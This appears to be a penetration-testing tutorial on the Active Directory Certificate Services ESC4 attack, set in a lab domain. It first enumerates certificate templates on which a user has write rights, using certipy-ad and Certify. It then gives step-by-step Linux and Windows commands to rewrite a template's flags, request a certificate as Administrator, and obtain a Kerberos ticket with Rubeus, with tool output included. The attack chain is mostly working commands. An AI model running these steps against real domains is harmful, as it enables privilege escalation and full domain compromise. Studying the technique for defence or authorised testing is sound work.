This attack scenario targets the *DACL(Access control list)* associated with a *Certificate Templates*. To execute an `ESC4` attack, having powerful rights over the certificate templates **is necessary**. By manipulating these objects, we can introduce a misconfiguration to a template that is not vulnerable.


## Requisites
As named in the introduction our user is required holding write/edit permission over a *Certifcate Template* and to make a template vulnerable, the following attributes need to be modified with the specified values to make the certificate vulnerable :
- Grant Enrollment rights for the vulnerable template.
- Disable the `PEND_ALL_REQUESTS` flag in `mspki-enrollment-flag` to deactivate Manager Approval.
- Set the `mspki-ra-signature` attribute to `0` to disable the `Authorized Signature requirement`.
- Enable the `ENROLLEE_SUPPLIES_SUBJECT` flag in `mspki-certificate-name-flag` to allow requesting users to specify another privileged account name as a `SAN`.
- Set the `mspki-certificate-application-policy` to a certificate purpose for authentication:
    - Client Authentication (OID: 1.3.6.1.5.5.7.3.2)
    - Smart Card Logon (OID: 1.3.6.1.4.1.311.20.2.2)
    - PKINIT Client Authentication (OID: 1.3.6.1.5.2.3.4)
    - Any Purpose (OID: 2.5.29.37.0)
    - No Extended Key Usage (EKU)


## Enumeration
To identify potential Templates that can be used to carry an ESC4 type attack we can do:
**Linux:**
```
certipy-ad find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout

<SNIP>                      
  2                                                                                                                                               
    Template Name                       : ESC4                                                                                                    
    Display Name                        : ESC4
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Full Control Principals         : LAB.LOCAL\Black Wasp
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
                                          LAB.LOCAL\Black Wasp
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
                                          LAB.LOCAL\Black Wasp
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
                                          LAB.LOCAL\Black Wasp
    [!] Vulnerabilities
      ESC4                              : 'LAB.LOCAL\\Black Wasp' has dangerous permissions
```
What we are looking for here is user `Black Wasp` has `Full Control` on this template.

**Windows:**
```
.\Certify.exe find

[*] Available Certificates Templates :
<SNIP>

    CA Name                               : LAB-DC.lab.local\lab-LAB-DC-CA
    Template Name                         : ESC4
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : LAB\Domain Admins             S-1-5-21-2570265163-3918697770-3667495639-512
                                      LAB\Domain Users              S-1-5-21-2570265163-3918697770-3667495639-513
                                      LAB\Enterprise Admins         S-1-5-21-2570265163-3918697770-3667495639-519
        All Extended Rights         : LAB\blwasp                    S-1-5-21-2570265163-3918697770-3667495639-1103
      Object Control Permissions
        Owner                       : LAB\Administrator             S-1-5-21-2570265163-3918697770-3667495639-500
        Full Control Principals     : LAB\blwasp                    S-1-5-21-2570265163-3918697770-3667495639-1103
        WriteOwner Principals       : LAB\Administrator             S-1-5-21-2570265163-3918697770-3667495639-500
                                      LAB\blwasp                    S-1-5-21-2570265163-3918697770-3667495639-1103
                                      LAB\Domain Admins             S-1-5-21-2570265163-3918697770-3667495639-512
                                      LAB\Enterprise Admins         S-1-5-21-2570265163-3918697770-3667495639-519
        WriteDacl Principals        : LAB\Administrator             S-1-5-21-2570265163-3918697770-3667495639-500
                                      LAB\blwasp                    S-1-5-21-2570265163-3918697770-3667495639-1103
                                      LAB\Domain Admins             S-1-5-21-2570265163-3918697770-3667495639-512
                                      LAB\Enterprise Admins         S-1-5-21-2570265163-3918697770-3667495639-519
        WriteProperty Principals    : LAB\Administrator             S-1-5-21-2570265163-3918697770-3667495639-500
                                      LAB\blwasp                    S-1-5-21-2570265163-3918697770-3667495639-1103
                                      LAB\Domain Admins             S-1-5-21-2570265163-3918697770-3667495639-512
                                      LAB\Enterprise Admins         S-1-5-21-2570265163-3918697770-3667495639-519

<SNIP>
```


# Attack Time
The attack vector can be performed on same ways both from a Window or Linux based OS.
## Linux way
After we identified that our user have editing permission over a particular *Certificate Template*, we can proceed to edit the template and make it vulnerable for a possible PE.
- We start editing the actual configuration of the Template to make it vulnerable to several attack paths, specifically the *ESC1*.  This command will save the old config to a JSON file in order to be able to revert back afterwards...
```
certipy-ad template -u 'BlWasp@lab.local' -p 'Password123!' -template ESC4 -save-old
```
- Now we can check the actual configuration associated to the Template with the following command. And edit to match the requirements table.
```
certipy-ad find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout

<SNIP> 
  2                                                                      
    Template Name                       : ESC4                           
    Display Name                        : ESC4                                                                                                    
    Certificate Authorities             : lab-LAB-DC-CA                  
    Enabled                             : True                                                                                                    
    Client Authentication               : True                                                                                                    
    Enrollment Agent                    : True                           
    Any Purpose                         : True                   
    Enrollee Supplies Subject           : True                   
    Certificate Name Flag               : EnrolleeSuppliesSubject    
    Enrollment Flag                     : None                   
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False                  
    Authorized Signatures Required      : 0
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
```
- We can request a *Alternative SAN(aka ESC1)* for Administrator's user.
```
certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template ESC4 -upn Administrator@lab.local
```
- Now with a valid *pfx* certificate we can perform the actual authentication and gain a valid TGT ticket for the Administrator user.
```
certipy-ad auth -pfx administrator.pfx -username Administrator -domain lab.local
```
- We must revert back the original configuration back on the Template.
```
certipy-ad template -u 'BlWasp@lab.local' -p 'Password123!' -template ESC4 -configuration ESC4.json
```
Enjoy the **pfx** to take you attacks further into the environment.

## Windows way
- We start by adding the **Certificate Enrollment** rights to our user.
```
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1

 Add-DomainObjectAcl -TargetIdentity ESC4 -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=lab,DC=local" -Verbose
```
- Next we need to remove the **Manager Approval**.
```
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-enrollment-flag'=9} -Verbose
```
- We need to remove the **Authorized Signature Requirement**.
```
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-ra-signature'=0} -Verbose
```
- To make the Template vulnerable to example attack type ESC1 we need to enable the SAN names specification.
```
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-name-flag'=1} -Verbose
```
- Allow the certificate to be used for *Client Authentication* via EKU settings.
```
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'pkiextendedkeyusage'='1.3.6.1.5.5.7.3.2'} -Verbose
```
- And set the **mspki-certificate-application-policy** to match the Client Authentication as well.
```
 Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```
- Now we can request the malicious template we just edited.
```
.\Certify.exe request /ca:LAB-DC\lab-LAB-DC-CA /template:ESC4 /altname:Administrator
```
- Convert from PEM to PFX
```
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in admin-esc4.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin-esc4.pfx
```
- Use the *pfx* to perform a authentication and get a valid TGT certificate that can be used from same session.
```
.\Rubeus.exe asktgt /user:administrator /certificate:admin-esc4.pfx /getcredentials /ptt
```
